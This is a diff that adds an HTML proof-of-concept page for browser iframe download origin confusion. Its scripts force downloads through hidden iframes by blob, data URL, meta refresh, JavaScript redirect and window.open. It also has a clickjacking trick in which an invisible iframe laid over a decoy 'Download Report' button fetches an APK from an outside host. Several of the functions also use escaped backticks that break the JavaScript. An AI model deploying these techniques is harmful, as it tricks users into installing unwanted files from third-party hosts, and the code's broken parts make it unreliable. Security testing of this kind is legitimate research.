@@ -1,0 +1,108 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Iframe Download Origin Confusion PoC</title>
+  <style>
+    body { font-family: sans-serif; padding: 20px; }
+    button { margin: 10px 0; padding: 10px 20px; }
+    iframe { display: none; }
+  </style>
+</head>
+<body>
+
+  <h1>🧪 Iframe Download Origin Confusion - Full PoC Suite</h1>
+  <p>Click each test button below to trigger a different download method.</p>
+
+  <!-- Buttons for triggering each test -->
+  <button onclick="runBlobDownload()">Test 1: Blob Download (JS-generated file)</button><br>
+  <button onclick="runMetaRedirect()">Test 2: Meta Redirect to File</button><br>
+  <button onclick="runDataUrlDownload()">Test 3: Data URL File Download</button><br>
+  <button onclick="runJSRedirect()">Test 4: JS Redirect to File</button><br>
+  <button onclick="runWindowOpen()">Test 5: window.open() to File</button><br>
+  <button onclick="runClickjackDemo()">Test 6: Fake Button Clickjack (requires user click)</button><br>
+
+  <hr>
+
+  <!-- Clickjacking-style UI -->
+  <div id="clickjack-container" style="position:relative;width:200px;height:50px;margin-top:20px;">
+    <button style="width:100%;height:100%;z-index:2;position:absolute;">Click to Download Report</button>
+    <iframe id="clickjack-frame" sandbox="allow-scripts allow-downloads"
+            srcdoc="
+              <a href='https://bughunter-6.github.io/SummaTest/test.apk' download
+                 style='position:absolute;top:0;left:0;width:200px;height:50px;opacity:0;'>
+                 Invisible download
+              </a>"
+            style="position:absolute;top:0;left:0;width:200px;height:50px;opacity:0;z-index:1;">
+    </iframe>
+  </div>
+
+  <!-- Dynamic iframe for tests -->
+  <iframe id="testFrame"></iframe>
+
+  <script>
+    function runBlobDownload() {
+      const iframe = document.getElementById('testFrame');
+      iframe.srcdoc = `
+        <script>
+          const blob = new Blob(['Blob-based download test.'], { type: 'text/plain' });
+          const url = URL.createObjectURL(blob);
+          const a = document.createElement('a');
+          a.href = url;
+          a.download = 'blob-download.txt';
+          document.body.appendChild(a);
+          a.click();
+          setTimeout(() => URL.revokeObjectURL(url), 1000);
+        <\/script>
+      `;
+    }
+
+    function runMetaRedirect() {
+      const iframe = document.getElementById('testFrame');
+      iframe.srcdoc = \`
+        <!DOCTYPE html>
+        <html><head>
+          <meta http-equiv="refresh" content="1;url=https://bughunter-6.github.io/SummaTest/test.apk">
+          <title>Redirecting...</title>
+        </head><body>Meta Redirect to download...</body></html>
+      \`;
+    }
+
+    function runDataUrlDownload() {
+      const iframe = document.getElementById('testFrame');
+      iframe.srcdoc = \`
+        <script>
+          const a = document.createElement('a');
+          a.href = 'data:text/plain;base64,VGhpcyBpcyBhIGRhdGEgdXJsIGZpbGUu';
+          a.download = 'dataurl.txt';
+          document.body.appendChild(a);
+          a.click();
+        <\/script>
+      \`;
+    }
+
+    function runJSRedirect() {
+      const iframe = document.getElementById('testFrame');
+      iframe.srcdoc = \`
+        <script>
+          window.location.href = 'https://bughunter-6.github.io/SummaTest/test.apk';
+        <\/script>
+      \`;
+    }
+
+    function runWindowOpen() {
+      const iframe = document.getElementById('testFrame');
+      iframe.srcdoc = \`
+        <script>
+          window.open('https://bughunter-6.github.io/SummaTest/test.apk');
+        <\/script>
+      \`;
+    }
+
+    function runClickjackDemo() {
+      alert('Click the "Click to Download Report" button above to test clickjacking.\nThe click will trigger a hidden download link from an iframe.');
+    }
+  </script>
+
+</body>
+</html>
